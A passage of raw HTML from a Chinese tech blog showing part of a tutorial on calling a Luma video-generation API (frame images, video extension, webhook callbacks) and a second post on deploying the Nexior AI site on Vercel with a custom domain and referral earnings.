                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"12a18694-fd4b-47e7-9c50-34f30862cff6"</span>,</span><br><span class="line">  <span class="attr">"video_id"</span>: <span class="string">"0105c090-03a5-425a-8026-523341cd575b"</span>,</span><br><span class="line">  <span class="attr">"prompt"</span>: <span class="string">"Astronauts shuttle from space to volcano"</span>,</span><br><span class="line">  <span class="attr">"video_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/12a18694-fd4b-47e7-9c50-34f30862cff6.mp4"</span>,</span><br><span class="line">  <span class="attr">"video_height"</span>: <span class="number">656</span>,</span><br><span class="line">  <span class="attr">"video_width"</span>: <span class="number">1552</span>,</span><br><span class="line">  <span class="attr">"state"</span>: <span class="string">"completed"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/12a18694-fd4b-47e7-9c50-34f30862cff6.jpg"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_width"</span>: <span class="number">1552</span>,</span><br><span class="line">  <span class="attr">"thumbnail_height"</span>: <span class="number">656</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>最后得到的结果与上文的类似的，生成的视频首帧包含了我们传入的图片，当然也可以同时传入首尾帧图片链接来生成视频，只需要在上面的基础上再加一个尾帧图片即可，尾帧的图片信息如下：</p>
                  <p><img src="https://cdn.acedata.cloud/0iad3k.png" alt="尾帧"></p>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/20igwi.png" width="500" class="m-auto"></p>
                  <p>最后得出如下结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"d1cb723a-e554-4775-94a4-bb6ae8c7ea67"</span>,</span><br><span class="line">  <span class="attr">"video_id"</span>: <span class="string">"6bebd0d2-f793-472e-9326-38528a9273bb"</span>,</span><br><span class="line">  <span class="attr">"prompt"</span>: <span class="string">"Astronauts shuttle from space to volcano"</span>,</span><br><span class="line">  <span class="attr">"video_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/d1cb723a-e554-4775-94a4-bb6ae8c7ea67.mp4"</span>,</span><br><span class="line">  <span class="attr">"video_height"</span>: <span class="number">656</span>,</span><br><span class="line">  <span class="attr">"video_width"</span>: <span class="number">1552</span>,</span><br><span class="line">  <span class="attr">"state"</span>: <span class="string">"completed"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/d1cb723a-e554-4775-94a4-bb6ae8c7ea67.jpg"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_width"</span>: <span class="number">1552</span>,</span><br><span class="line">  <span class="attr">"thumbnail_height"</span>: <span class="number">656</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>结果与上文是类似的，生成的视频同时包含了首帧与尾帧的图片，这也就完成了自定义首尾帧来生成视频。</p>
                  <h2 id="视频扩展功能"><a href="#视频扩展功能" class="headerlink" title="视频扩展功能"></a>视频扩展功能</h2>
                  <p>如果想对生成的视频进行继续生成的话，可以将参数 <code>action</code> 设置为 <code>extend</code> ，并且输入需要继续生成视频的ID或者视频链接，视频ID和视频链接的获取是根据基本使用来获取，如下图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/fwknj4.png" width="500" class="m-auto"></p>
                  <p>这时候可以看到视频的ID为：</p>
                  <figure class="highlight subunit">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">"video_id": "0105c090<span class="string">-03</span>a5<span class="string">-425</span>a<span class="string">-8026</span><span class="string">-523341</span>cd575b",</span><br><span class="line">"video_url": "https://platform.cdn.acedata.cloud/luma/12a18694-fd4b<span class="string">-47</span>e7<span class="string">-9</span>c50<span class="string">-34</span>f30862cff6.mp4"</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <blockquote>
                    <p>注意，这里的视频中 <code>video_id</code> 和 <code>video_url</code> 是生成后视频的ID和视频链接，如果你不知道如何生成视频，可以参考上文的基本使用来生成视频。</p>
                  </blockquote>
                  <p>要想继续生成视频的话必须上传视频链接或视频的ID，下面演示使用视频ID来进行扩展，接下来我们要必须填关键词自定义生成视频，就可以指定如下内容：</p>
                  <ul>
                    <li>action：此时扩展视频的行为，在这应为 <code>extend</code> 。</li>
                    <li>prompt：需要扩展视频的关键词。</li>
                    <li>video_url：需要扩展生成视频的链接。</li>
                    <li>video_id：需要扩展生成视频的唯一ID。</li>
                    <li>end_image_url：扩展生成视频可指定尾帧的图片链接，可选参数。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/vv0rxk.png" width="500" class="m-auto"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/woapxi.png" width="500" class="m-auto"></p>
                  <p>对应的Python代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://api.acedata.cloud/luma/videos"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"accept"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">    <span class="string">"authorization"</span>: <span class="string">"Bearer &#123;token&#125;"</span>,</span><br><span class="line">    <span class="string">"content-type"</span>: <span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"action"</span>: <span class="string">"extend"</span>,</span><br><span class="line">    <span class="string">"video_id"</span>: <span class="string">"0105c090-03a5-425a-8026-523341cd575b"</span>,</span><br><span class="line">    <span class="string">"prompt"</span>: <span class="string">"Astronauts shuttle from space to volcano"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=payload, headers=headers)</span><br><span class="line">print(response.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>点击运行，可以发现会得到一个结果，如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"c6e529d1-a06d-4c12-91b2-c855135131c3"</span>,</span><br><span class="line">  <span class="attr">"video_id"</span>: <span class="string">"36908c49-c2bb-4a11-bd5a-b8512b004818"</span>,</span><br><span class="line">  <span class="attr">"prompt"</span>: <span class="string">"Astronauts shuttle from space to volcano"</span>,</span><br><span class="line">  <span class="attr">"video_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/c6e529d1-a06d-4c12-91b2-c855135131c3.mp4"</span>,</span><br><span class="line">  <span class="attr">"video_height"</span>: <span class="number">656</span>,</span><br><span class="line">  <span class="attr">"video_width"</span>: <span class="number">1552</span>,</span><br><span class="line">  <span class="attr">"state"</span>: <span class="string">"completed"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/c6e529d1-a06d-4c12-91b2-c855135131c3.jpg"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_width"</span>: <span class="number">1552</span>,</span><br><span class="line">  <span class="attr">"thumbnail_height"</span>: <span class="number">656</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看出该视频是在需要扩展的视频基础上进行扩展的，结果内容与上文的是一致的，这也就实现歌曲的继续生成功能。</p>
                  <p>当然我们也可以指定视频的链接来进行扩展生成，填如下信息：</p>
                  <p><img src="https://cdn.acedata.cloud/0cv0hg.png" width="500" class="m-auto"></p>
                  <p>运行后得到了如下结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"1dcb5902-a7be-4b77-ba5d-dd8ec82b26ca"</span>,</span><br><span class="line">  <span class="attr">"video_id"</span>: <span class="string">"f0187dc2-339f-4a08-a435-c3a3341f620a"</span>,</span><br><span class="line">  <span class="attr">"prompt"</span>: <span class="string">"Astronauts shuttle from space to volcano"</span>,</span><br><span class="line">  <span class="attr">"video_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/1dcb5902-a7be-4b77-ba5d-dd8ec82b26ca.mp4"</span>,</span><br><span class="line">  <span class="attr">"video_height"</span>: <span class="number">656</span>,</span><br><span class="line">  <span class="attr">"video_width"</span>: <span class="number">1552</span>,</span><br><span class="line">  <span class="attr">"state"</span>: <span class="string">"completed"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/1dcb5902-a7be-4b77-ba5d-dd8ec82b26ca.jpg"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_width"</span>: <span class="number">1552</span>,</span><br><span class="line">  <span class="attr">"thumbnail_height"</span>: <span class="number">656</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>根据结果可以看出根据视频链接也可以实现视频扩展的功能。</p>
                  <p>最后我们还可以对扩展视频中指定一个尾帧图片来进行扩展，下面是尾帧图片信息：</p>
                  <p><img src="https://cdn.acedata.cloud/0iad3k.png" alt="尾帧"></p>
                  <p>接下来在上面的基础上添加尾帧图片信息，具体的如下所示：</p>
                  <p><img src="https://cdn.acedata.cloud/9p1vrj.png" width="500" class="m-auto"></p>
                  <p>点击运行后得到如下信息：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"b816b2b4-c345-4673-9e19-83e91f91b643"</span>,</span><br><span class="line">  <span class="attr">"video_id"</span>: <span class="string">"c5400053-63e6-4206-8082-31cf9dd1e7ed"</span>,</span><br><span class="line">  <span class="attr">"prompt"</span>: <span class="string">"Astronauts shuttle from space to volcano"</span>,</span><br><span class="line">  <span class="attr">"video_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/b816b2b4-c345-4673-9e19-83e91f91b643.mp4"</span>,</span><br><span class="line">  <span class="attr">"video_height"</span>: <span class="number">656</span>,</span><br><span class="line">  <span class="attr">"video_width"</span>: <span class="number">1552</span>,</span><br><span class="line">  <span class="attr">"state"</span>: <span class="string">"completed"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/b816b2b4-c345-4673-9e19-83e91f91b643.jpg"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_width"</span>: <span class="number">1552</span>,</span><br><span class="line">  <span class="attr">"thumbnail_height"</span>: <span class="number">656</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看出，在上文扩展视频的基础上，还可以指定尾帧图片来进行扩展。</p>
                  <h2 id="异步回调"><a href="#异步回调" class="headerlink" title="异步回调"></a>异步回调</h2>
                  <p>由于 Luma 生成视频的时间相对较长，大约需要 1-2 分钟，如果 API 长时间无响应，HTTP 请求会一直保持连接，导致额外的系统资源消耗，所以本 API 也提供了异步回调的支持。</p>
                  <p>整体流程是：客户端发起请求的时候，额外指定一个 <code>callback_url</code> 字段，客户端发起 API 请求之后，API 会立马返回一个结果，包含一个 <code>task_id</code> 的字段信息，代表当前的任务 ID。当任务完成之后，生成音乐的结果会通过 POST JSON 的形式发送到客户端指定的 <code>callback_url</code>，其中也包括了 <code>task_id</code> 字段，这样任务结果就可以通过 ID 关联起来了。</p>
                  <p>下面我们通过示例来了解下具体怎样操作。</p>
                  <p>首先，Webhook 回调是一个可以接收 HTTP 请求的服务，开发者应该替换为自己搭建的 HTTP 服务器的 URL。此处为了方便演示，使用一个公开的 Webhook 样例网站 <a href="https://webhook.site/，打开该网站即可得到一个" target="_blank" rel="noopener">https://webhook.site/，打开该网站即可得到一个</a> Webhook URL，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/q78okf.png" width="500" class="m-auto"></p>
                  <p>将此 URL 复制下来，就可以作为 Webhook 来使用，此处的样例为 <a href="https://webhook.site/0c87ca0e-cd74-4577-8d68-f2b80fbf8a13。" target="_blank" rel="noopener">https://webhook.site/0c87ca0e-cd74-4577-8d68-f2b80fbf8a13。</a></p>
                  <p>接下来，我们可以设置字段 <code>callback_url</code> 为上述 Webhook URL，同时填入 <code>prompt</code>，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/n2fjvi.png" width="500" class="m-auto"></p>
                  <p>点击运行，可以发现会立即得到一个结果，如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"732f8282-7cf8-401c-95f2-42c33aa079a6"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>稍等片刻，我们可以在 <a href="https://webhook.site/0c87ca0e-cd74-4577-8d68-f2b80fbf8a13" target="_blank" rel="noopener">https://webhook.site/0c87ca0e-cd74-4577-8d68-f2b80fbf8a13</a> 上观察到生成歌曲的结果，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/1hwm5m.png" alt=""></p>
                  <p>内容如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"task_id"</span>: <span class="string">"732f8282-7cf8-401c-95f2-42c33aa079a6"</span>,</span><br><span class="line">    <span class="attr">"video_id"</span>: <span class="string">"4d8013c3-5de0-41aa-966e-0b1a51d1c633"</span>,</span><br><span class="line">    <span class="attr">"prompt"</span>: <span class="string">"Astronauts shuttle from space to volcano"</span>,</span><br><span class="line">    <span class="attr">"video_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/732f8282-7cf8-401c-95f2-42c33aa079a6.mp4"</span>,</span><br><span class="line">    <span class="attr">"video_height"</span>: <span class="number">752</span>,</span><br><span class="line">    <span class="attr">"video_width"</span>: <span class="number">1360</span>,</span><br><span class="line">    <span class="attr">"state"</span>: <span class="string">"completed"</span>,</span><br><span class="line">    <span class="attr">"thumbnail_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/732f8282-7cf8-401c-95f2-42c33aa079a6.jpg"</span>,</span><br><span class="line">    <span class="attr">"thumbnail_width"</span>: <span class="number">1360</span>,</span><br><span class="line">    <span class="attr">"thumbnail_height"</span>: <span class="number">752</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到结果中有一个 <code>task_id</code> 字段，其他的字段都和上文类似，通过该字段即可实现任务的关联。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2024-09-06 20:01:22" itemprop="dateCreated datePublished" datetime="2024-09-06T20:01:22+08:00">2024-09-06</time>
                </span>
                <span id="/42369.html" class="post-meta-item leancloud_visitors" data-flag-title="Luma 视频生成 API 对接说明" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>7.2k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>7 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42368.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Nexior <i class="label-arrow"></i>
                  </a>
                  <a href="/42368.html" class="post-title-link" itemprop="url">利用 Vercel 快速搭建 Nexior AI 平台</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p><a href="https://github.com/AceDataCloud/Nexior" target="_blank" rel="noopener">Nexior</a> 是 GitHub 上的一个开源项目，利用它我们可以一键部署自己的 AI 应用站点，包括 AI 问答、Midjourney 绘画、知识库问答、艺术二维码等应用，无需自己开发 AI 系统、无需采购 AI 账号、无需关心 API 支持、无需配置支付系统，零启动成本，无风险通过 AI 赚取收益。</p>
                  <p>本文章会介绍 Nexior 项目在 Vercel 上的部署流程，无需任何编程技巧即可几分钟部署一套属于自己的 AI 站点，并轻松利用该站点获取收益。</p>
                  <h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2>
                  <p>首先打开 Nexior 的 GitHub 仓库，地址为：<a href="https://github.com/AceDataCloud/Nexior" target="_blank" rel="noopener">https://github.com/AceDataCloud/Nexior</a>，然后注册或登录 GitHub 账号，点击 Fork，克隆一份代码到自己的本地仓库，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/3zf2hx.png" alt=""></p>
                  <p>Fork 完毕之后，我们便可以得到如下自己的个人仓库，如下：</p>
                  <p><img src="https://cdn.acedata.cloud/bcxmlc.png" alt=""></p>
                  <p>这里的示例账号是 Germey，所以可以看到这里我们就 Fork 到了 Germey 这个用户下，同时有一个 forked from <a href="https://github.com/AceDataCloud/Nexior" target="_blank" rel="noopener">AceDataCloud/Nexior</a> 的字样，这样准备工作就完成了。</p>
                  <h2 id="Vercel-部署"><a href="#Vercel-部署" class="headerlink" title="Vercel 部署"></a>Vercel 部署</h2>
                  <p>Vercel 是一个可以帮助快速部署项目网站的平台，我们可以利用它直接和 GitHub 仓库对接，然后把 GitHub 仓库的源代码快速部署到线上，下面介绍下 Vercel 部署 Nexior 项目的流程。</p>
                  <p>打开 <a href="https://vercel.com/" target="_blank" rel="noopener">https://vercel.com/</a>，使用 GitHub 登录。</p>
                  <p>我们便会看到类似如下的页面，这时候点击 Import 按钮，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/jjcnnq.png" width="600" class="m-auto"></p>
                  <p>此时，Vercel 便展示了你的 GitHub 仓库，选择刚才 Fork 的 Nexior 仓库即可，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/38advc.png" width="600" class="m-auto"></p>
                  <p>找到 Nexior 仓库之后，点击 Import 按钮导入。</p>
                  <p>接着便会弹出一个配置页面，完全保持默认配置，点击 Deploy 按钮，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/6kvz1p.png" width="600" class="m-auto"></p>
                  <p>点击 Deploy 之后，Vercel 便开始构建整个项目并进行部署，我们不需要做任何操作，只需等待 1-2 分钟左右即可，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/1i9ss8.png" alt=""></p>
                  <p>部署完毕之后，Vercel 便会弹出一个页面恭喜你的部署已经完成，此时你就成功把 Nexior 项目部署到你的线上环境了，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/qn8ndd.png" alt=""></p>
                  <p>点击 Continue to Dashboard，我们便可以看到 Vercel 为我们生成的预览域名，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/c9p0r2.png" alt=""></p>
                  <p>此时直接打开这个链接，比如这里的样例地址是 <a href="https://nexior-germeys-projects.vercel.app/" target="_blank" rel="noopener">https://nexior-germeys-projects.vercel.app/</a>，打开之后，我们便可以看到 Nexior 项目的运行情况了。</p>
                  <p>打开之后注册登录一下，比如用邮箱、GitHub 登录都是可以的，登录完毕之后便可以看到一个配置页面，比如 Site Configuration，我们可以自行修改该站点的标题、Logo、Favicon、管理员等信息，如下图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/o4fuy6.png" width="600" class="m-auto"></p>
                  <p>同时还有一个比较重要的部分就是分销推广的配置，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/d8c4md.png" width="600" class="m-auto"></p>
                  <p>这里我们可以修改两个信息，一个叫默认邀请人 ID、一个叫强制邀请人 ID，说明如下：</p>
                  <ul>
                    <li>默认邀请人 ID：如果只设置了默认邀请人 ID，那么人人都可以分销和推广该站点，谁邀请的客户，客户的消费返利都会给到邀请人。如果站点的 URL 不携带任何推广信息的时候（URL 里面没有 inviter_id）的时候，注册用户默认情况下都会绑定到这个默认邀请人 ID 上。初始状态下这个 ID 就是站长的个人 ID。</li>
                    <li>强制邀请人 ID：如果设置了强制邀请人 ID，那么除了这个强制邀请人，其他人都无法从该站点获得分销返利，后台也看不到分销推广的入口。该站点所有注册用户都会被绑定到这个强制邀请人上面，所有的消费返利都是强制邀请人的。</li>
                  </ul>
                  <p>所以，对于以上两个模式，取决于站长的推广思路，视情况而定。</p>
                  <p>另外还有一个配置选项就是功能开关，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/zwi7hu.png" width="600" class="m-auto"></p>
                  <p>目前 Nexior 提供了多个功能，站长可以选择性地打开或关闭某些特定功能。</p>
                  <h2 id="自定义域名"><a href="#自定义域名" class="headerlink" title="自定义域名"></a>自定义域名</h2>
                  <p>现在我们已经成功部署了一个网站，但是域名是 Vercel 为我们分配的二级域名，其实并不利于对外推广，如果能够修改为我们的自定义域名的话就会好很多。</p>
                  <p>比如说我这边有一个 <a href="https://chictem.com" target="_blank" rel="noopener">https://chictem.com</a> 的域名，下面介绍下自定义域名的配置。</p>
                  <blockquote>
                    <p>如果没有域名，可以到各大域名厂商注册，例如 <a href="https://www.namecheap.com/" target="_blank" rel="noopener">namecheap</a>、<a href="https://godaddy.com/" target="_blank" rel="noopener">Godaddy</a> 等，一些中国境内服务商也可以。</p>
                  </blockquote>
                  <p>接下来我们打开 Vercel 的自定义域名配置页面：</p>
                  <p><img src="https://cdn.acedata.cloud/6mqomk.png" alt=""></p>
                  <p>此处输入你想要配置的自定义域名，比如这里示例配置为 <a href="https://chictem.com" target="_blank" rel="noopener">https://chictem.com</a>，就直接填写 chictem.com，不带 <code>https://</code> 前缀，点击 Add：</p>
                  <p><img src="https://cdn.acedata.cloud/v7idkv.png" alt=""></p>
                  <p>接下来 Vercel 提示要选择域名配置的选项，推荐我们也添加一个 www 开头的域名，这个可加可不加，添加了之后就可以 www 开头的域名也能访问到此网站。这里我们直接选择最后一项直接添加根域名：</p>
                  <p><img src="https://cdn.acedata.cloud/zmdx31.png" width="600" class="m-auto"></p>
                  <p>确定之后我们就发现这里提示有一个待配置的 DNS：</p>
                  <p><img src="https://cdn.acedata.cloud/fu7rt7.png" alt=""></p>
                  <p>这里让我们添加一个 A 记录，解析到 76.76.21.21，我们这时候需要转到域名服务商这里配置下 DNS。</p>
                  <blockquote>
                    <p>注意：域名服务商取决于你在哪个网站域名买的域名，通常来说你在哪个网站买的域名，网站后台就有配置 DNS 的入口。</p>
                  </blockquote>
                  <p>下面是一个 DNS 后台配置样例：</p>
                  <p><img src="https://cdn.acedata.cloud/isy712.png" alt=""></p>
                  <p>配置完毕之后，我们就能用自定义域名访问刚配置的网站了，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/ui08w3.png" alt=""></p>
                  <blockquote>
                    <p>注意：配置了新域名之后，注意我们需要进入到站点配置页面重新配置下站点标题、Logo 等选项，因为这个配置是跟域名绑定的，启用了新域名之后需要新配置站点。</p>
                  </blockquote>
                  <h2 id="代码更新"><a href="#代码更新" class="headerlink" title="代码更新"></a>代码更新</h2>
                  <p>因为 Nexior 的源代码是在持续更新的，可能不断有新的功能或者 Bug 修复，代码会直接同步到源代码仓库 <a href="https://github.com/AceDataCloud/Nexior" target="_blank" rel="noopener">https://github.com/AceDataCloud/Nexior</a> 这里。</p>
                  <p>那我们部署的站点如果想同步更新最新代码，应该怎么做呢？</p>
                  <p>其实很简单，回到 GitHub 里面我们 Fork 的代码仓库，这里可以看到我们原本 Fork 的代码仓库已经落后于官方 Nexior 源代码几个版本了，我们可以直接点击 Sync fork 按钮，然后点击 Update branch 就可以了：</p>
                  <p><img src="https://cdn.acedata.cloud/zs9tgq.png" alt=""></p>
                  <p>点击之后，我们 fork 的仓库的代码就会更新，代码更新之后，Vercel 这边的网站也会自动更新，稍等片刻重新刷新网页就发现网站更新了。</p>
                  <h2 id="赚取收益"><a href="#赚取收益" class="headerlink" title="赚取收益"></a>赚取收益</h2>
                  <p>现在我们已经有了自定义域名，配置好如上内容之后，就可以把这个站点分享出去赚钱啦！</p>
                  <p>所有的用户只要有付费账单，其中有一部分便会转化为收益到达分销者的账户，到时候添加客服提现即可。</p>
                  <p>进入分销界面，可以随时查看当前邀请人数、分销总金额、总奖励等，直接添加客服提现即可。</p>
                  <p><img src="https://cdn.acedata.cloud/zo05gl.png" width="600" class="m-auto"></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2024-07-29 20:01:22" itemprop="dateCreated datePublished" datetime="2024-07-29T20:01:22+08:00">2024-07-29</time>
                </span>
                <span id="/42368.html" class="post-meta-item leancloud_visitors" data-flag-title="利用 Vercel 快速搭建 Nexior AI 平台" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
